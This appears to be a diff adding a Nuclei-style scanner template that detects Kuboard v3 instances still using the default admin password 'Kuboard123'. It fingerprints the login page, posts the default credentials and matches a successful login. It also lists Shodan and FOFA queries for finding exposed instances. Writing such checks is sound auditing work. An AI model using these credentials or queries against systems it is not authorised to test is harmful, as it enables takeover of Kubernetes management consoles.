@@ -1,0 +1,60 @@
+id: kuboard-default-login
+
+info:
+  name: Kuboard - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Kuboard v3 creates the built-in administrator account admin with the default password Kuboard123 on first start unless KUBOARD_ADMIN_DERAULT_PASSWORD is set, and the password stays valid until it is changed.
+  reference:
+    - https://kuboard.cn/install/v3/install-built-in.html
+    - https://github.com/eip-work/kuboard-press/blob/master/install/v3/install-built-in.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: kuboard
+    product: kuboard
+    shodan-query: http.title:"Kuboard"
+    fofa-query: title="Kuboard"
+  tags: kuboard,kubernetes,default-login,vuln
+
+variables:
+  username: "admin"
+  password: "Kuboard123"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 303'
+          - 'regex("(?mi)^location:\\s*/sso/auth\\?[^\\r\\n]*client_id=kuboard-sso", header)'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /login/password HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "json")'
+          - 'contains_all(body, "\"status\":\"success\"", "\"mfaStatus\":\"NotConfigured\"")'
+        condition: and
+# digest: 4a0a0047304502205a9a83eb712cab75fa10433d5a903c89a0465a14be185b78c3f21812fa30bf11022100aac631de40b7d4753dd61b28dc17613adb83283aff3413b24656327c1fd53994:922c64590222798bb761d5b6d8e72950
